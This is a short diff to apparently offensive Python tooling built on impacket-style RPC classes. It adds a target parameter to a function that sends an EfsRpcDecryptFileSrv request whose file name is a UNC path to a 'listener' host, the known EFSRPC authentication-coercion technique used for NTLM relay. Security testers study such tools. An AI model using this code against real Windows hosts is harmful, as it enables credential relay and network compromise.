@@ -18,7 +18,7 @@ class EfsRpcDecryptFileSrvResponse(NDRCALL):
     structure = ()
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = EfsRpcDecryptFileSrv()
     request["OpenFlag"] = 0
     request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
